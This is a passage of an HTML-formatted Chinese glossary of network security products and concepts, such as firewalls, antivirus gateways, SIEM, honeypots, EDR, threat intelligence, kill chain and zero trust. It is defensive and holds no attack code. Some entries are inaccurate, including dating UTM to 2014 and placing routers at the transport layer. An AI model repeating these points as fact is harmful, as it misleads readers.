0);">反病毒引擎</font></h3><p><font style="color:rgb(0, 0, 0);">通俗理解，就是一套判断特定程序行为是否为病毒程序（包括可疑的）的技术机制。<br></font><font style="color:rgb(0, 0, 0);">例如奇安信自主研发的QOWL猫头鹰反病毒引擎。</font></p><h3 id="防毒墙"><a href="#防毒墙" class="headerlink" title="防毒墙"></a><font style="color:rgb(0, 0, 0);">防毒墙</font></h3><p><font style="color:rgb(0, 0, 0);">区别于部署在主机上的杀毒软件，防毒墙的部署方式与防火墙类似，主要部署于网络出口，用于对病毒进行扫描和拦截，因此防毒墙也被称为反病毒网关。</font></p><h3 id="老三样"><a href="#老三样" class="headerlink" title="老三样"></a><font style="color:rgb(0, 0, 0);">老三样</font></h3><p><font style="color:rgb(0, 0, 0);">通常指IDS、防火墙和反病毒三样历史最悠久安全产品。</font></p><h3 id="告警"><a href="#告警" class="headerlink" title="告警"></a><font style="color:rgb(0, 0, 0);">告警</font></h3><p><font style="color:rgb(0, 0, 0);">指网络安全设备对攻击行为产生的警报。</font></p><h3 id="误报"><a href="#误报" class="headerlink" title="误报"></a><font style="color:rgb(0, 0, 0);">误报</font></h3><p><font style="color:rgb(0, 0, 0);">也称为无效告警，通常指告警错误，即把合法行为判断成非法行为而产生了告警。<br></font><font style="color:rgb(0, 0, 0);">目前，由于攻击技术的快速进步和检测技术的限制，误报的数量非常大，使得安全人员不得不花费大量时间来处理此类告警，已经成为困扰并拉低日常安全处置效率的主要原因。</font></p><h3 id="漏报"><a href="#漏报" class="headerlink" title="漏报"></a><font style="color:rgb(0, 0, 0);">漏报</font></h3><p><font style="color:rgb(0, 0, 0);">通常指网络安全设备没有检测出非法行为而没有产生告警。一旦出现漏报，将大幅增加系统被入侵的风险。</font></p><h3 id="NAC"><a href="#NAC" class="headerlink" title="NAC"></a><font style="color:rgb(0, 0, 0);">NAC</font></h3><p><font style="color:rgb(0, 0, 0);">全称为Network Access Control，即网络准入控制，其宗旨是防止病毒和蠕虫等新兴黑客技术对企业安全造成危害。<br></font><font style="color:rgb(0, 0, 0);">借助NAC，客户可以只允许合法的、值得信任的终端设备（例如PC、服务器、PDA）接入网络，而不允许其它设备接入。</font></p><h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a><font style="color:rgb(0, 0, 0);">漏扫</font></h3><p><font style="color:rgb(0, 0, 0);">即漏洞扫描，指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测（渗透攻击）行为。</font></p><h3 id="UTM"><a href="#UTM" class="headerlink" title="UTM"></a><font style="color:rgb(0, 0, 0);">UTM</font></h3><p><font style="color:rgb(0, 0, 0);">即Unified Threat Management，中文名为统一威胁管理，最早由IDC于2014年提出，即将不同设备的安全能力（最早包括入侵检测、防火墙和反病毒技术），集中在同一网关上，实现统一管理和运维。</font></p><h3 id="网闸"><a href="#网闸" class="headerlink" title="网闸"></a><font style="color:rgb(0, 0, 0);">网闸</font></h3><p><font style="color:rgb(0, 0, 0);">网闸是使用带有多种控制功能的固态开关读写介质，连接两个独立主机系统的信息安全设备。<br></font><font style="color:rgb(0, 0, 0);">由于两个独立的主机系统通过网闸进行隔离，只有以数据文件形式进行的无协议摆渡。</font></p><h3 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a><font style="color:rgb(0, 0, 0);">堡垒机</font></h3><p><font style="color:rgb(0, 0, 0);">运用各种技术手段监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。</font></p><h3 id="数据库审计"><a href="#数据库审计" class="headerlink" title="数据库审计"></a><font style="color:rgb(0, 0, 0);">数据库审计</font></h3><p><font style="color:rgb(0, 0, 0);">能够实时记录网络上的数据库活动，对数据库操作进行细粒度审计的合规性管理，对数据库遭受到的风险行为进行告警，对攻击行为进行阻断。<br></font><font style="color:rgb(0, 0, 0);">它通过对用户访问数据库行为的记录、分析和汇报，用来帮助用户事后生成合规报告、事故追根溯源，同时加强内外部数据库网络行为记录，提高数据资产安全。</font></p><h3 id="DLP"><a href="#DLP" class="headerlink" title="DLP"></a><font style="color:rgb(0, 0, 0);">DLP</font></h3><p><font style="color:rgb(0, 0, 0);">数据防泄漏，通过数字资产的精准识别和策略制定，主要用于防止企业的指定数据或信息资产以违反安全策略规定的形式流出企业。</font></p><h3 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a><font style="color:rgb(0, 0, 0);">VPN</font></h3><p><font style="color:rgb(0, 0, 0);">虚拟专用网，在公用网络上建立专用网络，进行加密通讯，通过对数据包的加密和数据包目标地址的转换实现远程访问。</font></p><h3 id="SD-WAN"><a href="#SD-WAN" class="headerlink" title="SD-WAN"></a><font style="color:rgb(0, 0, 0);">SD-WAN</font></h3><p><font style="color:rgb(0, 0, 0);">即软件定义广域网，这种服务用于连接广阔地理范围的企业网络、数据中心、互联网应用及云服务。<br></font><font style="color:rgb(0, 0, 0);">这种服务的典型特征是将网络控制能力通过软件方式云化。<br></font><font style="color:rgb(0, 0, 0);">通常情况下，SD-WAN都集成有防火墙、入侵检测或者防病毒能力。并且从目前的趋势来看，以安全为核心设计的SD-WAN正在崭露头角，包括奇安信、Fortinet等多家安全厂商开始涉足该领域，并提供了较为完备的内生安全设计。</font></p><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a><font style="color:rgb(0, 0, 0);">路由器</font></h3><p><font style="color:rgb(0, 0, 0);">是用来连接不同子网的中枢，它们工作于OSI7层模型的传输层和网络层。<br></font><font style="color:rgb(0, 0, 0);">路由器的基本功能就是将网络信息包传输到它们的目的地。一些路由器还有访问控制列表（ACLs），允许将不想要的信息包过滤出去。<br></font><font style="color:rgb(0, 0, 0);">许多路由器都可以将它们的日志信息注入到IDS系统中，并且自带基础的包过滤（即防火墙）功能。</font></p><h3 id="网关"><a href="#网关" class="headerlink" title="网关"></a><font style="color:rgb(0, 0, 0);">网关</font></h3><p><font style="color:rgb(0, 0, 0);">通常指路由器、防火墙、IDS、VPN等边界网络设备。</font></p><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a><font style="color:rgb(0, 0, 0);">WAF</font></h3><p><font style="color:rgb(0, 0, 0);">即Web Application Firewall，即Web应用防火墙，是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</font></p><h3 id="SOC"><a href="#SOC" class="headerlink" title="SOC"></a><font style="color:rgb(0, 0, 0);">SOC</font></h3><p><font style="color:rgb(0, 0, 0);">即Security Operations Center，翻译为安全运行中心或者安全管理平台，通过建立一套实时的资产风险模型，协助管理员进行事件分析、风险分析、预警管理和应急响应处理的集中安全管理系统。</font></p><h3 id="LAS"><a href="#LAS" class="headerlink" title="LAS"></a><font style="color:rgb(0, 0, 0);">LAS</font></h3><p><font style="color:rgb(0, 0, 0);">日志审计系统，主要功能是提供日志的收集、检索和分析能力，可为威胁检测提供丰富的上下文。</font></p><h3 id="NOC"><a href="#NOC" class="headerlink" title="NOC"></a><font style="color:rgb(0, 0, 0);">NOC</font></h3><p><font style="color:rgb(0, 0, 0);">即Network Operations Center，网络操作中心或网络运行中心，是远程网络通讯的管理、监视和维护中心，是网络问题解决、软件分发和修改、路由、域名管理、性能监视的焦点。</font></p><h3 id="SIEM"><a href="#SIEM" class="headerlink" title="SIEM"></a><font style="color:rgb(0, 0, 0);">SIEM</font></h3><p><font style="color:rgb(0, 0, 0);">即Security Information and Event Management，安全信息和事件管理，负责从大量企业安全控件、主机操作系统、企业应用和企业使用的其他软件收集安全日志数据，并进行分析和报告。</font></p><h3 id="上网行为管理"><a href="#上网行为管理" class="headerlink" title="上网行为管理"></a><font style="color:rgb(0, 0, 0);">上网行为管理</font></h3><p><font style="color:rgb(0, 0, 0);">是指帮助互联网用户控制和管理对互联网使用的设备。<br></font><font style="color:rgb(0, 0, 0);">其包括对网页访问过滤、上网隐私保护、网络应用控制、带宽流量管理、信息收发审计、用户行为分析等。</font></p><h3 id="蜜罐（Honeypot）"><a href="#蜜罐（Honeypot）" class="headerlink" title="蜜罐（Honeypot）"></a><font style="color:rgb(0, 0, 0);">蜜罐（Honeypot）</font></h3><p><font style="color:rgb(0, 0, 0);">是一个包含漏洞的系统，它摸拟一个或多个易受攻击的主机，给黑客提供一个容易攻击的目标。<br></font><font style="color:rgb(0, 0, 0);">由于蜜罐没有其它任务需要完成，因此所有连接的尝试都应被视为是可疑的。<br></font><font style="color:rgb(0, 0, 0);">蜜罐的另一个用途是拖延攻击者对其真正目标的攻击，让攻击者在蜜罐上浪费时间。<br></font><font style="color:rgb(0, 0, 0);">蜜罐类产品包括蜜网、蜜系统、蜜账号等等。</font></p><h3 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a><font style="color:rgb(0, 0, 0);">沙箱</font></h3><p><font style="color:rgb(0, 0, 0);">沙箱是一种用于安全的运行程序的机制。它常常用来执行那些非可信的程序。<br></font><font style="color:rgb(0, 0, 0);">非可信程序中的恶意代码对系统的影响将会被限制在沙箱内而不会影响到系统的其它部分。</font></p><h3 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a><font style="color:rgb(0, 0, 0);">沙箱逃逸</font></h3><p><font style="color:rgb(0, 0, 0);">一种识别沙箱环境，并利用静默、欺骗等技术，绕过沙箱检测的现象</font></p><h3 id="网络靶场"><a href="#网络靶场" class="headerlink" title="网络靶场"></a><font style="color:rgb(0, 0, 0);">网络靶场</font></h3><p><font style="color:rgb(0, 0, 0);">主要是指通过虚拟环境与真实设备相结合，模拟仿真出真实赛博网络空间攻防作战环境，能够支撑攻防演练、安全教育、网络空间作战能力研究和网络武器装备验证试验平台。</font></p><h2 id="2．技术与服务"><a href="#2．技术与服务" class="headerlink" title="2．技术与服务"></a><font style="color:rgb(0, 0, 0);">2．技术与服务</font></h2><h3 id="加密技术"><a href="#加密技术" class="headerlink" title="加密技术"></a><font style="color:rgb(0, 0, 0);">加密技术</font></h3><p><font style="color:rgb(0, 0, 0);">加密技术包括两个元素：算法和密钥。<br></font><font style="color:rgb(0, 0, 0);">算法是将普通的文本与一串数字（密钥）的结合，产生不可理解的密文的步骤，密钥是用来对数据进行编码和解码的一种算法。<br></font><font style="color:rgb(0, 0, 0);">密钥加密技术的密码体制分为对称密钥体制和非对称密钥体制两种。相应地，对数据加密的技术分为两类，即对称加密（私人密钥加密）和非对称加密（公开密钥加密）。对称加密的加密密钥和解密密钥相同，而非对称加密的加密密钥和解密密钥不同，加密密钥可以公开而解密密钥需要保密。</font></p><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a><font style="color:rgb(0, 0, 0);">黑名单</font></h3><p><font style="color:rgb(0, 0, 0);">顾名思义，黑名单即不好的名单，凡是在黑名单上的软件、IP地址等，都被认为是非法的。</font></p><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a><font style="color:rgb(0, 0, 0);">白名单</font></h3><p><font style="color:rgb(0, 0, 0);">与黑名单对应，白名单即“好人”的名单，凡是在白名单上的软件、IP等，都被认为是合法的，可以在计算机上运行。</font></p><h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a><font style="color:rgb(0, 0, 0);">内网</font></h3><p><font style="color:rgb(0, 0, 0);">通俗的讲就是局域网，比如网吧、校园网、公司内部网等都属于此类。<br></font><font style="color:rgb(0, 0, 0);">查看IP地址，如果是在以下三个范围之内，就说明我们是处于内网之中的：10.0.0.0—10.255.255.255，172.16.0.0—172.31.255.255，192.168.0.0—192.168.255.255</font></p><h3 id="外网"><a href="#外网" class="headerlink" title="外网"></a><font style="color:rgb(0, 0, 0);">外网</font></h3><p><font style="color:rgb(0, 0, 0);">直接连入INTERNET（互连网），可以与互连网上的任意一台电脑互相访问。</font></p><h3 id="边界防御"><a href="#边界防御" class="headerlink" title="边界防御"></a><font style="color:rgb(0, 0, 0);">边界防御</font></h3><p><font style="color:rgb(0, 0, 0);">以网络边界为核心的防御模型，以静态规则匹配为基础，强调把所有的安全威胁都挡在外网。</font></p><h3 id="南北向流量"><a href="#南北向流量" class="headerlink" title="南北向流量"></a><font style="color:rgb(0, 0, 0);">南北向流量</font></h3><p><font style="color:rgb(0, 0, 0);">通常指数据中心内外部通信所产生的的流量。</font></p><h3 id="东西向流量"><a href="#东西向流量" class="headerlink" title="东西向流量"></a><font style="color:rgb(0, 0, 0);">东西向流量</font></h3><p><font style="color:rgb(0, 0, 0);">通常指数据中心内部不同主机之间互相通信所产生的的流量。</font></p><h3 id="规则库"><a href="#规则库" class="headerlink" title="规则库"></a><sup><font style="color:rgb(0, 0, 0);">规则库</font></sup></h3><p><font style="color:rgb(0, 0, 0);">网络安全的核心数据库，类似于黑白名单，用于存储大量安全规则，一旦访问行为和规则库完成匹配，则被认为是非法行为。所以有人也将规则库比喻为网络空间的法律。</font></p><h3 id="下一代"><a href="#下一代" class="headerlink" title="下一代"></a><font style="color:rgb(0, 0, 0);">下一代</font></h3><p><font style="color:rgb(0, 0, 0);">网络安全领域经常用到，用于表示产品或者技术有较大幅度的创新，在能力上相对于传统方法有明显的进步，通常缩写为NG（Next Gen）。<br></font><font style="color:rgb(0, 0, 0);">例如NGFW（下一代防火墙）、NGSOC（下一代安全管理平台）等。</font></p><h3 id="大数据安全分析"><a href="#大数据安全分析" class="headerlink" title="大数据安全分析"></a><font style="color:rgb(0, 0, 0);">大数据安全分析</font></h3><p><font style="color:rgb(0, 0, 0);">区别于传统被动规则匹配的防御模式，以主动收集和分析大数据的方法，找出其中可能存在的安全威胁，因此也称数据驱动安全。<br></font><font style="color:rgb(0, 0, 0);">该理论最早由奇安信于2015年提出。</font></p><h3 id="EPP"><a href="#EPP" class="headerlink" title="EPP"></a><font style="color:rgb(0, 0, 0);">EPP</font></h3><p><font style="color:rgb(0, 0, 0);">全称为Endpoint Protection Platform，翻译为端点保护平台，部署在终端设备上的安全防护解决方案,用于防止针对终端的恶意软件、恶意脚本等安全威胁，通常与EDR进行联动。</font></p><h3 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a><font style="color:rgb(0, 0, 0);">EDR</font></h3><p><font style="color:rgb(0, 0, 0);">全称Endpoint Detection &amp; Response，即端点检测与响应，通过对端点进行持续检测，同时通过应用程序对操作系统调用等异常行为分析，检测和防护未知威胁，最终达到杀毒软件无法解决未知威胁的目的。</font></p><h3 id="NDR"><a href="#NDR" class="headerlink" title="NDR"></a><font style="color:rgb(0, 0, 0);">NDR</font></h3><p><font style="color:rgb(0, 0, 0);">全称Network Detection &amp; Response，即网络检测与响应，通过对网络侧流量的持续检测和分析，帮助企业增强威胁响应能力，提高网络安全的可见性和威胁免疫力。</font></p><h3 id="安全可视化"><a href="#安全可视化" class="headerlink" title="安全可视化"></a><font style="color:rgb(0, 0, 0);">安全可视化</font></h3><p><font style="color:rgb(0, 0, 0);">指在网络安全领域中的呈现技术，将网络安全加固、检测、防御、响应等过程中的数据和结果转换成图形界面，并通过人机交互的方式进行搜索、加工、汇总等操作的理论、方法和技术。</font></p><h3 id="NTA"><a href="#NTA" class="headerlink" title="NTA"></a><font style="color:rgb(0, 0, 0);">NTA</font></h3><p><font style="color:rgb(0, 0, 0);">网络流量分析（NTA）的概念是Gartner于2013年首次提出的，位列五种检测高级威胁的手段之一。<br></font><font style="color:rgb(0, 0, 0);">它融合了传统的基于规则的检测技术，以及机器学*和其他高级分析技术，用以检测企业网络中的可疑行为，尤其是失陷后的痕迹。</font></p><h3 id="MDR"><a href="#MDR" class="headerlink" title="MDR"></a><font style="color:rgb(0, 0, 0);">MDR</font></h3><p><font style="color:rgb(0, 0, 0);">全称Managed Detection &amp; Response，即托管检测与响应，依靠基于网络和主机的检测工具来识别恶意模式。<br></font><font style="color:rgb(0, 0, 0);">此外，这些工具通常还会从防火墙之内的终端收集数据，以便更全面地监控网络活动。</font></p><h3 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a><font style="color:rgb(0, 0, 0);">应急响应</font></h3><p><font style="color:rgb(0, 0, 0);">通常是指一个组织为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的措施。</font></p><h3 id="XDR"><a href="#XDR" class="headerlink" title="XDR"></a><font style="color:rgb(0, 0, 0);">XDR</font></h3><p><font style="color:rgb(0, 0, 0);">通常指以检测和响应技术为核心的网络安全策略的统称，包括EDR、NDR、MDR等。</font></p><h3 id="安全运营"><a href="#安全运营" class="headerlink" title="安全运营"></a><font style="color:rgb(0, 0, 0);">安全运营</font></h3><p><font style="color:rgb(0, 0, 0);">贯穿产品研发、业务运行、漏洞修复、防护与检测、应急响应等一系列环节，实行系统的管理方法和流程，将各个环节的安全防控作用有机结合，保障整个业务的安全性。</font></p><h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a><font style="color:rgb(0, 0, 0);">威胁情报</font></h3><p><font style="color:rgb(0, 0, 0);">根据Gartner的定义，威胁情报是某种基于证据的知识，包括上下文、机制、标示、含义和能够执行的建议，这些知识与资产所面临已有的或酝酿中的威胁或危害相关，可用于资产相关主体对威胁或危害的响应或处理决策提供信息支持。根据使用对象的不同，威胁情报主要分为人读情报和机读情报。</font></p><h3 id="TTP"><a href="#TTP" class="headerlink" title="TTP"></a><font style="color:rgb(0, 0, 0);">TTP</font></h3><p><font style="color:rgb(0, 0, 0);">主要包括三要素，战术Tactics、技术Techniques和过程Procedures，是描述高级威胁组织及其攻击的重要指标，作为威胁情报的一种重要组成部分，TTP可为安全分析人员提供决策支撑。</font></p><h3 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a><font style="color:rgb(0, 0, 0);">IOC</font></h3><p><font style="color:rgb(0, 0, 0);">中文名为失陷标示：用以发现内部被APT团伙、木马后门、僵尸网络控制的失陷主机，类型上往往是域名、URL等。<br></font><font style="color:rgb(0, 0, 0);">目前而言，IOC是应用最为广泛的威胁情报，因为其效果最为直接。一经匹配，则意味着存在已经失陷的主机。</font></p><h3 id="上下文"><a href="#上下文" class="headerlink" title="上下文"></a><font style="color:rgb(0, 0, 0);">上下文</font></h3><p><font style="color:rgb(0, 0, 0);">从文章的上下文引申而来，主要是指某项威胁指标的关联信息，用于实现更加精准的安全匹配和检测。</font></p><h3 id="STIX"><a href="#STIX" class="headerlink" title="STIX"></a><font style="color:rgb(0, 0, 0);">STIX</font></h3><p><font style="color:rgb(0, 0, 0);">STIX是一种描述网络威胁信息的结构化语言，能够以标准化和结构化的方式获取更广泛的网络威胁信息，常用于威胁情报的共享与交换，目前在全球范围内使用最为广泛。<br></font><font style="color:rgb(0, 0, 0);">STIX在定义了8中构件的1.0版本基础上，已经推出了定义了12中构件的2.0版本。</font></p><h3 id="杀伤链"><a href="#杀伤链" class="headerlink" title="杀伤链"></a><font style="color:rgb(0, 0, 0);">杀伤链</font></h3><p><font style="color:rgb(0, 0, 0);">杀伤链最早来源于军事领域，用于描述进攻一方各个阶段的状态。<br></font><font style="color:rgb(0, 0, 0);">在网络安全领域，这一概念最早由洛克希德-马丁公司提出，英文名称为Kill Chain，也称作网络攻击生命周期，包括侦查追踪、武器构建、载荷投递、漏洞利用、安装植入、命令控制、目标达成等七个阶段，来识别和防止入侵。</font></p><h3 id="ATT-CK"><a href="#ATT-CK" class="headerlink" title="ATT&amp;CK"></a><font style="color:rgb(0, 0, 0);">ATT&amp;CK</font></h3><p><font style="color:rgb(0, 0, 0);">可以简单理解为描述攻击者技战术的知识库。<br></font><font style="color:rgb(0, 0, 0);">MITRE在2013年推出了该模型，它是根据真实的观察数据来描述和分类对抗行为。<br></font><font style="color:rgb(0, 0, 0);">ATT&amp;CK将已知攻击者行为转换为结构化列表，将这些已知的行为汇总成战术和技术，并通过几个矩阵以及结构化威胁信息表达式（STIX）、指标信息的可信自动化交换（TAXII）来表示。</font></p><h3 id="钻石模型"><a href="#钻石模型" class="headerlink" title="钻石模型"></a><font style="color:rgb(0, 0, 0);">钻石模型</font></h3><p><font style="color:rgb(0, 0, 0);">钻石模型在各个领域的应用都十分广泛，在网络安全领域，钻石模型首次建立了一种将科学原理应用于入侵分析的正式方法：<br></font><font style="color:rgb(0, 0, 0);">可衡量、可测试和可重复——提供了一个对攻击活动进行记录、(信息)合成、关联的简单、正式和全面的方法。<br></font><font style="color:rgb(0, 0, 0);">这种科学的方法和简单性可以改善分析的效率、效能和准确性。</font></p><h3 id="关联分析"><a href="#关联分析" class="headerlink" title="关联分析"></a><font style="color:rgb(0, 0, 0);">关联分析</font></h3><p><font style="color:rgb(0, 0, 0);">又称关联挖掘，就是在交易数据、关系数据或其他信息载体中，查找存在于项目集合或对象集合之间的频繁模式、关联、相关性或因果结构。<br></font><font style="color:rgb(0, 0, 0);">在网络安全领域主要是指将不同维度、类型的安全数据进行关联挖掘，找出其中潜在的入侵行为。</font></p><h3 id="态势感知"><a href="#态势感知" class="headerlink" title="态势感知"></a><font style="color:rgb(0, 0, 0);">态势感知</font></h3><p><font style="color:rgb(0, 0, 0);">是一种基于环境的、动态、整体地洞悉安全风险的能力，是以安全大数据为基础，从全局视角提升对安全威胁的发现识别、理解分析、响应处置能力的一种方式，最终是为了决策与行动，是安全能力的落地。</font></p><h3 id="探针"><a href="#探针" class="headerlink" title="探针"></a><font style="color:rgb(0, 0, 0);">探针</font></h3><p><font style="color:rgb(0, 0, 0);">也叫作网络安全探针或者安全探针，可以简单理解为赛博世界的摄像头，部署在网络拓扑的关键节点上，用于收集和分析流量和日志，发现异常行为，并对可能到来的攻击发出预警。</font></p><h3 id="网络空间测绘"><a href="#网络空间测绘" class="headerlink" title="网络空间测绘"></a><font style="color:rgb(0, 0, 0);">网络空间测绘</font></h3><p><font style="color:rgb(0, 0, 0);">用搜索引擎技术来提供交互，让人们可以方便的搜索到网络空间上的设备。<br></font><font style="color:rgb(0, 0, 0);">相对于现实中使用的地图，用各种测绘方法描述和标注地理位置，用主动或被动探测的方法，来绘制网络空间上设备的网络节点和网络连接关系图，及各设备的画像。</font></p><h3 id="SOAR"><a href="#SOAR" class="headerlink" title="SOAR"></a><font style="color:rgb(0, 0, 0);">SOAR</font></h3><p><font style="color:rgb(0, 0, 0);">全称Security Orchestration, Automation and Response，意即安全编排自动化与响应，主要通过剧本化、流程化的指令，对入侵行为采取的一系列自动化或者半自动化响应处置动作。</font></p><h3 id="UEBA"><a href="#UEBA" class="headerlink" title="UEBA"></a><font style="color:rgb(0, 0, 0);">UEBA</font></h3><p><font style="color:rgb(0, 0, 0);">全称为User and Entity Behavior Analytics，即用户实体行为分析，一般通过大数据分析的方法，分析用户以及IT实体的行为，从而判断是否存在非法行为。</font></p><h3 id="内存保护"><a href="#内存保护" class="headerlink" title="内存保护"></a><font style="color:rgb(0, 0, 0);">内存保护</font></h3><p><font style="color:rgb(0, 0, 0);">内存保护是操作系统对电脑上的内存进行访问权限管理的一个机制。内存保护的主要目的是防止某个进程去访问不是操作系统配置给它的寻址空间。</font></p><h3 id="RASP"><a href="#RASP" class="headerlink" title="RASP"></a><font style="color:rgb(0, 0, 0);">RASP</font></h3><p><font style="color:rgb(0, 0, 0);">全称为Runtime application self-protection，翻译成应用运行时自我保护。<br></font><font style="color:rgb(0, 0, 0);">在2014年时由Gartner提出，它是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预。</font></p><h3 id="包检测"><a href="#包检测" class="headerlink" title="包检测"></a><font style="color:rgb(0, 0, 0);">包检测</font></h3><p><font style="color:rgb(0, 0, 0);">对于流量包、数据包进行拆包、检测的行为。</font></p><h3 id="深度包检测"><a href="#深度包检测" class="headerlink" title="深度包检测"></a><font style="color:rgb(0, 0, 0);">深度包检测</font></h3><p><font style="color:rgb(0, 0, 0);">Deep Packet Inspection，缩写为 DPI，又称完全数据包探测（complete packet inspection）或信息萃取（Information eXtraction，IX），是一种计算机网络数据包过滤技术，用来检查通过检测点之数据包的数据部分（亦可能包含其标头），以搜索不匹配规范之协议、病毒、垃圾邮件、入侵迹象。</font></p><h3 id="全流量检测"><a href="#全流量检测" class="headerlink" title="全流量检测"></a><font style="color:rgb(0, 0, 0);">全流量检测</font></h3><p><font style="color:rgb(0, 0, 0);">全流量主要体现在三个“全”上，即全流量采集与保存，全行为分析以及全流量回溯。<br></font><font style="color:rgb(0, 0, 0);">通过全流量分析设备，实现网络全流量采集与保存、全行为分析与全流量回溯，并提取网络元数据上传到大数据分析平台实现更加丰富的功能。</font></p><h3 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a><font style="color:rgb(0, 0, 0);">元数据</font></h3><p><font style="color:rgb(0, 0, 0);">元数据（Metadata），又称中介数据、中继数据，为描述数据的数据（data about data），主要是描述数据属性（property）的信息，用来支持如指示存储位置、历史数据、资源查找、文件记录等功能。</font></p><h3 id="欺骗检测"><a href="#欺骗检测" class="headerlink" title="欺骗检测"></a><font style="color:rgb(0, 0, 0);">欺骗检测</font></h3><p><font style="color:rgb(0, 0, 0);">以构造虚假目标来欺骗并诱捕攻击者，从而达到延误攻击节奏，检测和分析攻击行为的目的。</font></p><h3 id="微隔离"><a href="#微隔离" class="headerlink" title="微隔离"></a><font style="color:rgb(0, 0, 0);">微隔离</font></h3><p><font style="color:rgb(0, 0, 0);">顾名思义是细粒度更小的网络隔离技术，能够应对传统环境、虚拟化环境、混合云环境、容器环境下对于东西向流量隔离的需求，重点用于阻止攻击者进入企业数据中心网络内部后的横向平移。</font></p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a><font style="color:rgb(0, 0, 0);">逆向</font></h3><p><font style="color:rgb(0, 0, 0);">常见于逆向工程或者逆向分析，简单而言，一切从产品中提取原理及设计信息并应用于再造及改进的行为，都是逆向工程。<br></font><font style="color:rgb(0, 0, 0);">在网络安全中，更多的是调查取证、恶意软件分析等。</font></p><h3 id="无代理安全"><a href="#无代理安全" class="headerlink" title="无代理安全"></a><font style="color:rgb(0, 0, 0);">无代理安全</font></h3><p><font style="color:rgb(0, 0, 0);">在终端安全或者虚拟化安全防护中，往往需要在每一台主机或者虚机上安装agent（代理程序）来实现，这种方式往往需要消耗大量的资源。<br></font><font style="color:rgb(0, 0, 0);">而无代理安全则不用安装agent，可以减少大量的部署运维工作，提升管理效率。</font></p><h3 id="CWPP"><a href="#CWPP" class="headerlink" title="CWPP"></a><font style="color:rgb(0, 0, 0);">CWPP</font></h3><p><font style="color:rgb(0, 0, 0);">全称Cloud Workload Protection Platform，意为云工作负载保护平台，主要是指对云上应用和工作负载（包括虚拟主机和容器主机上的工作负载）进行保护的技术，实现了比过去更加细粒度的防护，是现阶段云上安全的最后一道防线。</font></p><h3 id="CSPM"><a href="#CSPM" class="headerlink" title="CSPM"></a><font style="color:rgb(0, 0, 0);">CSPM</font></h3><p><font style="color:rgb(0, 0, 0);">云安全配置管理，能够对基础设施安全配置进行分析与管理。这些安全配置包括账号特权、网络和存储配置、以及安全配置（如加密设置）。如果发现配置不合规，CSPM会采取行动进行修正。</font></p><h3 id="CASB"><a href="#CASB" class="headerlink" title="CASB"></a><font style="color:rgb(0, 0, 0);">CASB</font></h3><p><font style="color:rgb(0, 0, 0);">全称Cloud Access Security Broker，即云端接入安全代理。作为部署在客户和云服务商之间的安全策略控制点，是在访问基于云的资源时企业实施的安全策略。</font></p><h3 id="防爬"><a href="#防爬" class="headerlink" title="防爬"></a><font style="color:rgb(0, 0, 0);">防爬</font></h3><p><font style="color:rgb(0, 0, 0);">意为防爬虫，主要是指防止网络爬虫从自身网站中爬取信息。网络爬虫是一种按照一定的规则，自动地抓取网络信息的程序或者脚本。</font></p><h3 id="安全资源池"><a href="#安全资源池" class="headerlink" title="安全资源池"></a><font style="color:rgb(0, 0, 0);">安全资源池</font></h3><p><font style="color:rgb(0, 0, 0);">安全资源池是多种安全产品虚拟化的集合，涵盖了服务器终端、网络、业务、数据等多种安全能力。</font></p><h3 id="IAM"><a href="#IAM" class="headerlink" title="IAM"></a><font style="color:rgb(0, 0, 0);">IAM</font></h3><p><font style="color:rgb(0, 0, 0);">全称为Identity and Access Management，即身份与访问管理，经常也被叫做身份认证。</font></p><h3 id="4A"><a href="#4A" class="headerlink" title="4A"></a><font style="color:rgb(0, 0, 0);">4A</font></h3><p><font style="color:rgb(0, 0, 0);">即认证Authentication、授权Authorization、账号Account、审计Audit，即融合统一用户账号管理、统一认证管理、统一授权管理和统一安全审计四要素后的解决方案将，涵盖单点登录（SSO）等安全功能。</font></p><p><font style="color:rgb(0, 0, 0);">Access Control list(ACL)</font></p><p><font style="color:rgb(0, 0, 0);">访问控制列表。</font></p><h3 id="多因子认证"><a href="#多因子认证" class="headerlink" title="多因子认证"></a><font style="color:rgb(0, 0, 0);">多因子认证</font></h3><p><font style="color:rgb(0, 0, 0);">主要区别于单一口令认证的方式，要通过两种以上的认证机制之后，才能得到授权，使用计算机资源。<br></font><font style="color:rgb(0, 0, 0);">例如，用户要输入PIN码，插入银行卡，最后再经指纹比对，通过这三种认证方式，才能获得授权。这种认证方式可以降低单一口令失窃的风险，提高安全性。</font></p><h3 id="特权账户管理"><a href="#特权账户管理" class="headerlink" title="特权账户管理"></a><font style="color:rgb(0, 0, 0);">特权账户管理</font></h3><p><font style="color:rgb(0, 0, 0);">简称PAM。由于特权账户往往拥有很高的权限，因此一旦失窃或被滥用，会给机构带来非常大的网络安全风险。所以，特权账户管理往往在显得十分重要。<br></font><font style="color:rgb(0, 0, 0);">其主要原则有：杜绝特权凭证共享、为特权使用赋以个人责任、为日常管理实现最小权限访问模型、对这些凭证执行的活动实现审计功能。</font></p><h3 id="零信任"><a href="#零信任" class="headerlink" title="零信任"></a><font style="color:rgb(0, 0, 